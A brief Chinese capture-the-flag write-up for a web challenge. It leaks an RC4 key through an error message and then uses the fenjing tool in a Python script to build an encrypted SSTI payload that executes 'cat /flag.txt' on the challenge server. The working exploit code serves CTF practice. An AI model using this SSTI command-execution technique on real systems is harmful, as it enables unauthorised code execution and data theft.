- # 思路
	- 通过报错读取加密密钥+SSTI
- # 报错
	- 猜出SSTI URI为`/secret`，参数为`secret`
	- 提交`/secret?secret=114514`发现关键语句`rc=rc4_Modified.RC4("HereIsTreasure")   #解密`
- # SSTI
	- 写一个WAF函数传给fenjing即可
	- 坑： ((64aa797b-5c66-46bd-8e25-dd7a6c1a85ac))
	- 代码：
		- ```python
		  from Crypto.Cipher import ARC4
		  from urllib.parse import quote
		  import functools
		  import requests
		  import fenjing
		  
		  url = "http://node3.anna.nssctf.cn:28163"
		  
		  def encode(s):
		      cipher = ARC4.new(b"HereIsTreasure")
		      ciphertext = cipher.encrypt(s.encode("latin-1"))
		      return quote("".join(chr(c) for c in ciphertext).encode())
		  
		  @functools.lru_cache(1000)
		  def waf(s):
		      print(s)
		      r = requests.get(f"{url}/secret?secret=" + encode(s))
		      return "not allowed" not in r.text
		  
		  if __name__ == "__main__":
		      payload, will_print = fenjing.exec_cmd_payload(waf, "cat /flag.txt")
		      if not will_print:
		          print("payload不会产生回显")
		      r = requests.get(f"{url}/secret?secret=" + encode(payload))
		      print(payload)
		      print(r.text)
		  
		  ```